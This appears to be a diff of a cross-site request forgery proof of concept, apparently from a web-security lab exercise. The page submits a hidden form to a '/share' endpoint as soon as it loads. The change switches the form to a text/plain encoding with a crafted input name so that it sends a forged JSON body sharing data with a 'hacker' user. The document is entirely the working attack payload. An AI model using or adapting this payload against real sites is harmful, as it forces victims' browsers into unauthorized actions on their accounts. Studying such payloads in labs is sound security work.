@@ -1,8 +1,7 @@
 <html>
   <body onload="document.getElementById('csrf').submit()">
-    <form action="http://ptl-92437cfbf4ce-a26e5f32d9cf.libcurl.me/share" method=POST id=csrf>
-      <input type="hidden" name="user" value="hacker" />
-      <input type="hidden" name="id" value="0" />
+    <form action="http://ptl-92437cfbf4ce-a26e5f32d9cf.libcurl.me/share" method=POST id=csrf enctype="text/plain">
+      <input name='{"user":"hacker","id":0,"fake":"' value='"}'>
     </form>
   </body>
 </html>
